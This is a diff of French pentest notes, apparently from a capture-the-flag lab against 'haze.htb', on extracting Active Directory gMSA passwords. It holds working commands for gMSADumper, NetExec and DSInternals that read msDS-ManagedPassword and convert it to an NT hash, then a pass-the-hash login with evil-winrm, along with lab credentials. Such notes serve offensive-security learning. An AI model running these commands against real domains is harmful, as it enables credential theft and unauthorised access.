@@ -6,16 +6,40 @@
 
 {% embed url="https://www.netwrix.com/gmsa_exploitation_attack.html?ref=benheater.com" %}
 
+Les **gMSA** sont des comptes de service _automatiquement gérés_ par Active Directory.\
+Ils ont été introduits à partir de Windows Server 2012.
+
+Ce sont des comptes **ordinaires d’Active Directory**,\
+mais :
+
+* ils ont **un mot de passe généré et renouvelé automatiquement** par le DC,
+* ils sont **utilisés par des serveurs ou services Windows** (SQL, IIS, etc.),
+* et leur mot de passe **n’est jamais stocké localement en clair**.
+
+***
+
+#### <mark style="color:green;">⚙️ Structure dans AD :</mark>
+
+Dans AD, un gMSA est un **objet utilisateur spécial** :
+
+| Attribut AD                                  | Description                                                             |
+| -------------------------------------------- | ----------------------------------------------------------------------- |
+| `sAMAccountName`                             | Nom du gMSA (ex: `SQL01$`)                                              |
+| `msDS-ManagedPassword`                       | Contient le mot de passe chiffré                                        |
+| `PrincipalsAllowedToRetrieveManagedPassword` | Liste des entités (machines ou users) autorisées à lire le mot de passe |
+| `servicePrincipalName`                       | SPN associé (si utilisé pour Kerberos)                                  |
+
 Un **gMSA** est un compte de service AD dont le mot de passe est géré automatiquement par le **KDS (Key Distribution Service)**.\
 Il est **long, complexe, change régulièrement** → mais **n’est jamais tapé à la main**.\
 👉 En revanche, certains outils permettent de le lire / convertir pour exploitation (ex: Pass-the-Hash).
 
 ***
 
-### 1️⃣ gMSADumper (Python)
+### <mark style="color:blue;">1️⃣ gMSADumper (Python)</mark>
 
-#### Installation & usage :
+#### <mark style="color:green;">Installation & usage :</mark>
 
+{% code fullWidth="true" %}
 ```bash
 git clone https://github.com/micahvandeusen/gMSADumper
 cd gMSADumper
@@ -25,12 +49,13 @@ python3 -m pip install -r requirements.txt
 
 python3 gMSADumper.py -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -l dc01.haze.htb -d haze.htb
 ```
+{% endcode %}
 
 * **+ :** Récupère le blob `msDS-ManagedPassword` via LDAP.
 * **+ :** Donne directement le mot de passe en clair du gMSA.
 * **– :** Nécessite Python + dépendances.
 
-#### Exemple sortie :
+#### <mark style="color:green;">Exemple sortie :</mark>
 
 ```
 gMSA Account: Haze-IT-Backup$
@@ -39,9 +64,9 @@ Password: S0m3_Rand0m_GMSA_P@ssw0rd!
 
 ***
 
-### 2️⃣ NetExec (ex CrackMapExec)
+### <mark style="color:blue;">2️⃣ NetExec (ex CrackMapExec)</mark>
 
-#### Commande simple :
+#### <mark style="color:green;">Commande simple :</mark>
 
 ```bash
 nxc ldap dc01.haze.htb -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa
@@ -53,9 +78,9 @@ nxc ldap dc01.haze.htb -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa
 
 ***
 
-### 3️⃣ DSInternals (PowerShell)
+### <mark style="color:blue;">3️⃣ DSInternals (PowerShell)</mark>
 
-#### Étapes :
+#### <mark style="color:green;">Étapes :</mark>
 
 1. Télécharger + préparer module :
 
@@ -84,12 +109,12 @@ ConvertTo-NTHash -Password $secureString
 
 ***
 
-### 🔑 Exploitation après extraction
+### <mark style="color:blue;">🔑 Exploitation après extraction</mark>
 
 * Avec **mot de passe en clair** → connexion RDP / services directement.
 * Avec **NTLM Hash** → Pass-the-Hash via `evil-winrm`, `smbexec`, `wmiexec`, etc.
 
-#### Exemple :
+#### <mark style="color:green;">Exemple :</mark>
 
 ```bash
 evil-winrm -i dc01.haze.htb -u 'Haze-IT-Backup$' -H 'ab45e0f0c7d0a92b12ce9843fbaabc2c'
@@ -97,7 +122,7 @@ evil-winrm -i dc01.haze.htb -u 'Haze-IT-Backup$' -H 'ab45e0f0c7d0a92b12ce9843fba
 
 ***
 
-## 📌 Tableau comparatif
+## <mark style="color:blue;">📌 Tableau comparatif</mark>
 
 | Outil           | Sortie obtenue        | Avantage principal                | Limite principale    |
 | --------------- | --------------------- | --------------------------------- | -------------------- |
